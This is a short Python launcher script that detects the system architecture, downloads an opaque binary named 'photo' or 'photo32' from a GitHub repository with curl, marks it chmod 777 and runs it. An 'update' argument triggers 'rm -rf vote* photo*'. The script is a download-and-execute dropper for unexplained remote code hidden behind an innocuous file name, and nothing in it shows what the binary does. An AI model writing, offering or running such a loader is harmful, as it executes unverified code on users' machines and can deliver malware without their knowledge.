#coding=utf-8
import os, sys, platform
try:
    if sys.argv[1]=='update':
        os.system('rm -rf vote* photo*')
except:
    pass
bit = platform.architecture()[0]
if bit == '64bit':
    if not os.path.isfile('photo'):
        os.system('curl -L https://github.com/SHOOTER-MAKER/Juttbrand/blob/main/photo?raw=true -o photo')
        os.system('chmod 777 photo')
        os.system('./photo')
    else:
        os.system('./photo')
elif bit == '32bit':
    if not os.path.isfile('photo32'):
        os.system('curl -L https://github.com/SHOOTER-MAKER/Juttbrand/blob/main/photo32?raw=true -o photo32')
        os.system('chmod 777 photo32')
        os.system('./photo32')
    else:
        os.system('./photo32')
else:
    print ('Your device is not supported ')
    exit()
